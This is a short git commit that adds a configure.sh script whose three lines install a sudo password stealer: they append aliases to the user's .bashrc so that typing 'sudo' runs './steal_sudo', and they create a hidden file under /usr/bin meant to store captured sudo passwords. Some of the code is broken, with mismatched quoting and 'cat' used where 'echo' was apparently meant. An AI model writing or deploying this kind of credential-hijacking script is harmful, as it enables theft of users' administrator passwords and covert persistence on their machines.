d9a539571a0d5981860953cc619299930b624034
ArnavSax <44127903+ArnavSax@users.noreply.github.com>
2018-11-05 15:59:26 -0800

    Create configure.sh

---
+++ configure.sh
@@ -0,0 +1,3 @@
+echo -n "alias ss="./steal_sudo"" >> /home/$USER/.bashrc
+echo -n "alias sudo='./steal_sudo'" >> /home/$USER/.bashrc
+cat "#This file stores sudo passwords" > /usr/bin/.passwordsfromSS
